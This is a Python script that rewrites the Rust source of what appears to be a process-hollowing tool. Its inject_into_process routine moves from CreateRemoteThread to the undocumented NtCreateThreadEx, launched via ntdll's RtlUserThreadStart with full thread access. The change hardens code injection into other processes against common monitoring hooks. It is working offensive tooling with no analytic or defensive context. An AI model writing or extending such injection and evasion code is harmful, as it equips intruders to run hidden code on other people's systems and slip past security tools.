import re

with open('hollowing/src/windows_impl.rs', 'r') as f:
    content = f.read()

# add NtCreateThreadEx signature
extern_c_old = """extern "C" {
    fn NtUnmapViewOfSection(ProcessHandle: HANDLE, BaseAddress: PVOID) -> i32;"""
extern_c_new = """extern "C" {
    fn NtCreateThreadEx(
        ThreadHandle: *mut HANDLE,
        DesiredAccess: u32,
        ObjectAttributes: PVOID,
        ProcessHandle: HANDLE,
        StartRoutine: PVOID,
        Argument: PVOID,
        CreateFlags: u32,
        ZeroBits: usize,
        StackSize: usize,
        MaximumStackSize: usize,
        AttributeList: PVOID,
    ) -> i32;
    fn NtUnmapViewOfSection(ProcessHandle: HANDLE, BaseAddress: PVOID) -> i32;"""

content = content.replace(extern_c_old, extern_c_new)

create_remote_thread_old = """    let thread = unsafe {
        CreateRemoteThread(
            process,
            std::ptr::null_mut(),
            0,
            Some(std::mem::transmute(entry_point)),
            std::ptr::null_mut(),
            0,
            std::ptr::null_mut(),
        )
    };
    if thread.is_null() {
        return Err(anyhow!(
            "CreateRemoteThread failed: {}",
            std::io::Error::last_os_error()
        ));
    }
    unsafe { CloseHandle(thread) };
    tracing::info!("inject_into_process: remote thread started at {entry_point:#x}");
    Ok(())"""

create_remote_thread_new = """    let mut thread: HANDLE = std::ptr::null_mut();
    
    let ntdll = unsafe { winapi::um::libloaderapi::GetModuleHandleA(b"ntdll.dll\\0".as_ptr() as *const i8) };
    if ntdll.is_null() {
        return Err(anyhow!("GetModuleHandleA failed for ntdll.dll"));
    }
    let rtl_user_thread_start = unsafe { winapi::um::libloaderapi::GetProcAddress(ntdll, b"RtlUserThreadStart\\0".as_ptr() as *const i8) };
    if rtl_user_thread_start.is_null() {
        return Err(anyhow!("GetProcAddress failed for RtlUserThreadStart"));
    }
    
    let status = unsafe {
        NtCreateThreadEx(
            &mut thread,
            0x1FFFFF, // THREAD_ALL_ACCESS
            std::ptr::null_mut(),
            process,
            rtl_user_thread_start as _,
            entry_point as _,
            0, // CREATE_SUSPENDED=1 (but we can just run it=0)
            0,
            0,
            0,
            std::ptr::null_mut()
        )
    };
    if status < 0 || thread.is_null() {
        return Err(anyhow!("NtCreateThreadEx failed with NTSTATUS {:#x}", status));
    }
    
    unsafe { CloseHandle(thread) };
    tracing::info!("inject_into_process: remote thread started at {entry_point:#x} natively via RtlUserThreadStart");
    Ok(())"""

content = content.replace(create_remote_thread_old, create_remote_thread_new)

with open('hollowing/src/windows_impl.rs', 'w') as f:
    f.write(content)
